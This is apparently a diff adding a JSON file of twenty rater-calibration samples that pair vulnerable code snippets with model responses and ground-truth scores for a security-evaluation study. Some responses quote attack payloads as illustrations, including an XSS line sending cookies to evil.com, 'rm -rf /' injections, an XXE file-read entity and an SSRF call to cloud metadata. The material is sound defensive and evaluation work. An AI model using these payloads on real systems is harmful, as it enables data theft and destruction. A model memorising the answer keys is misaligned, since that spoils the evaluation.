@@ -1,0 +1,179 @@
+{
+  "description": "20 calibration samples used for rater training before main scoring",
+  "calibration_protocol": {
+    "duration": "2 hours",
+    "process": [
+      "Raters score independently",
+      "Compare and discuss disagreements",
+      "Refine understanding of rubric criteria",
+      "Re-score until κ > 0.80"
+    ]
+  },
+  "samples": [
+    {
+      "id": "cal_01",
+      "cwe": "CWE-89",
+      "code": "def get_user(id): return db.execute(f'SELECT * FROM users WHERE id={id}')",
+      "response": "This is SQL injection. User input is concatenated directly. Use parameterized queries. Severity: 9",
+      "ground_truth": {"identify": 1, "understand": 3, "fix": 2, "severity": 9},
+      "notes": "Model correctly identifies and explains but fix lacks detail"
+    },
+    {
+      "id": "cal_02", 
+      "cwe": "CWE-78",
+      "code": "import os\ndef run(cmd): os.system(cmd)",
+      "response": "This code runs arbitrary commands which is dangerous.",
+      "ground_truth": {"identify": 1, "understand": 1, "fix": 0, "severity": 10},
+      "notes": "Identifies but superficial understanding, no fix provided"
+    },
+    {
+      "id": "cal_03",
+      "cwe": "CWE-79",
+      "code": "return f'<div>{user_input}</div>'",
+      "response": "XSS vulnerability. Attacker could inject <script>alert(1)</script>. Fix: use html.escape(). Severity: 7",
+      "ground_truth": {"identify": 1, "understand": 3, "fix": 3, "severity": 7},
+      "notes": "Full marks - identifies, explains with payload, correct fix"
+    },
+    {
+      "id": "cal_04",
+      "cwe": "CWE-22",
+      "code": "open(f'/data/{filename}')",
+      "response": "Path traversal possible with ../. Use os.path.basename. 6/10",
+      "ground_truth": {"identify": 1, "understand": 2, "fix": 2, "severity": 6},
+      "notes": "Partial understanding and fix"
+    },
+    {
+      "id": "cal_05",
+      "cwe": "CWE-502",
+      "code": "pickle.loads(data)",
+      "response": "Insecure deserialization! Pickle can execute arbitrary code during unpickling. An attacker could craft a malicious pickle that runs os.system('rm -rf /'). Never unpickle untrusted data - use JSON instead. Critical severity: 10",
+      "ground_truth": {"identify": 1, "understand": 3, "fix": 3, "severity": 10},
+      "notes": "Perfect response with exploitation path and rationale"
+    },
+    {
+      "id": "cal_06",
+      "cwe": "CWE-94",
+      "code": "eval(user_expr)",
+      "response": "Code injection. Use ast.literal_eval for safety.",
+      "ground_truth": {"identify": 1, "understand": 1, "fix": 2, "severity": 10},
+      "notes": "Superficial understanding but correct fix"
+    },
+    {
+      "id": "cal_07",
+      "cwe": "CWE-918",
+      "code": "requests.get(user_url)",
+      "response": "This could be SSRF. Validate URL against whitelist. Medium severity.",
+      "ground_truth": {"identify": 1, "understand": 2, "fix": 2, "severity": 7},
+      "notes": "Partial - mentions SSRF but vague on severity"
+    },
+    {
+      "id": "cal_08",
+      "cwe": "CWE-611",
+      "code": "etree.parse(xml_input)",
+      "response": "The code looks fine for parsing XML.",
+      "ground_truth": {"identify": 0, "understand": 0, "fix": 0, "severity": 0},
+      "notes": "Failed to identify XXE vulnerability"
+    },
+    {
+      "id": "cal_09",
+      "cwe": "CWE-89",
+      "code": "cursor.execute('SELECT * FROM t WHERE x=' + val)",
+      "response": "SQL injection via string concatenation. Input like \"1 OR 1=1\" bypasses conditions. Use cursor.execute('SELECT * FROM t WHERE x=?', (val,)) to separate data from query structure. High severity 8-9.",
+      "ground_truth": {"identify": 1, "understand": 3, "fix": 3, "severity": 8},
+      "notes": "Excellent response"
+    },
+    {
+      "id": "cal_10",
+      "cwe": "CWE-78",
+      "code": "subprocess.call(f'grep {pattern} file', shell=True)",
+      "response": "Command injection. The pattern variable is inserted into shell command. Attacker could use pattern='; rm -rf /'. Fix: subprocess.call(['grep', pattern, 'file']) without shell=True. Severity: 9",
+      "ground_truth": {"identify": 1, "understand": 3, "fix": 3, "severity": 9},
+      "notes": "Full marks"
+    },
+    {
+      "id": "cal_11",
+      "cwe": "CWE-79",
+      "code": "document.innerHTML = userText",
+      "response": "XSS. Use textContent instead.",
+      "ground_truth": {"identify": 1, "understand": 1, "fix": 3, "severity": 7},
+      "notes": "Correct but minimal explanation"
+    },
+    {
+      "id": "cal_12",
+      "cwe": "CWE-22",
+      "code": "shutil.copy(src_path, dst)",
+      "response": "Could have path traversal if src_path is user controlled. Validate with os.path.realpath() and check it starts with allowed directory. Severity 7.",
+      "ground_truth": {"identify": 1, "understand": 2, "fix": 3, "severity": 7},
+      "notes": "Good fix but mechanism could be clearer"
+    },
+    {
+      "id": "cal_13",
+      "cwe": "CWE-502",
+      "code": "yaml.load(config_str)",
+      "response": "yaml.load is unsafe and can execute arbitrary code. Use yaml.safe_load() instead. Severity: 9",
+      "ground_truth": {"identify": 1, "understand": 2, "fix": 3, "severity": 9},
+      "notes": "Correct but could explain HOW it executes code"
+    },
+    {
+      "id": "cal_14",
+      "cwe": "CWE-94",
+      "code": "exec(f'x = {user_input}')",
+      "response": "This is very dangerous! Never use exec with user input.",
+      "ground_truth": {"identify": 1, "understand": 1, "fix": 0, "severity": 10},
+      "notes": "Identifies danger but no explanation or fix"
+    },
+    {
+      "id": "cal_15",
+      "cwe": "CWE-918",
+      "code": "urllib.urlopen(callback_url).read()",
+      "response": "SSRF vulnerability. Attacker could use callback_url='http://169.254.169.254/latest/meta-data/' to access AWS metadata or internal services. Validate domain whitelist and block private IP ranges. Critical for cloud deployments: 9/10",
+      "ground_truth": {"identify": 1, "understand": 3, "fix": 3, "severity": 9},
+      "notes": "Excellent - specific exploitation scenario"
+    },
+    {
+      "id": "cal_16",
+      "cwe": "CWE-611",
+      "code": "xml.dom.minidom.parseString(xml_data)",
+      "response": "XXE vulnerability. External entities are enabled by default. Attacker can read files: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>. Use defusedxml library. Severity 8.",
+      "ground_truth": {"identify": 1, "understand": 3, "fix": 3, "severity": 8},
+      "notes": "Complete with payload example"
+    },
+    {
+      "id": "cal_17",
+      "cwe": "CWE-89",
+      "code": "Model.objects.raw(f'SELECT * WHERE name={name}')",
+      "response": "Even Django ORM can have SQL injection with raw(). Use parameters: Model.objects.raw('SELECT * WHERE name=%s', [name])",
+      "ground_truth": {"identify": 1, "understand": 2, "fix": 3, "severity": 8},
+      "notes": "Good Django-specific knowledge"
+    },
+    {
+      "id": "cal_18",
+      "cwe": "CWE-78",
+      "code": "os.popen(f'ls {directory}')",
+      "response": "os.popen is deprecated and vulnerable to command injection. Use subprocess.run(['ls', directory], capture_output=True) instead.",
+      "ground_truth": {"identify": 1, "understand": 2, "fix": 3, "severity": 8},
+      "notes": "Good modern alternative"
+    },
+    {
+      "id": "cal_19",
+      "cwe": "CWE-79",
+      "code": "response.write(request.GET['msg'])",
+      "response": "Reflected XSS. User input from GET parameter is written directly to response without escaping. Attack: ?msg=<script>document.location='http://evil.com/'+document.cookie</script>. Fix: django.utils.html.escape(). Severity: 7",
+      "ground_truth": {"identify": 1, "understand": 3, "fix": 3, "severity": 7},
+      "notes": "Full marks with realistic attack"
+    },
+    {
+      "id": "cal_20",
+      "cwe": "CWE-22",
+      "code": "with open(os.path.join(BASE, user_file)) as f:",
+      "response": "os.path.join doesn't prevent traversal if user_file is absolute like '/etc/passwd'. Check: resolved = os.path.realpath(os.path.join(BASE, user_file)); assert resolved.startswith(os.path.realpath(BASE))",
+      "ground_truth": {"identify": 1, "understand": 3, "fix": 3, "severity": 8},
+      "notes": "Excellent - catches os.path.join pitfall"
+    }
+  ],
+  "aggregate_irr": {
+    "pre_calibration": 0.71,
+    "post_calibration": 0.89,
+    "main_study": 0.847
+  }
+}
